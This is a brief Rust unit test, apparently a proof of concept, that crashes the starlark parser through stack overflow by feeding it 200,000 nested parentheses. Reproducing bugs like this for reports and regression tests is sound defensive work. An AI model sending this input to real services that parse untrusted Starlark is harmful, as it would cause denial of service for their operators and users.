use starlark::syntax::AstModule;
use starlark::syntax::Dialect;

#[test]
fn poc_stack_overflow() {
    let n = 200_000;
    let src = format!("{}{}{}", "(".repeat(n), "1", ")".repeat(n));
    let _ = AstModule::parse("poc.bzl", src, &Dialect::Standard);
}
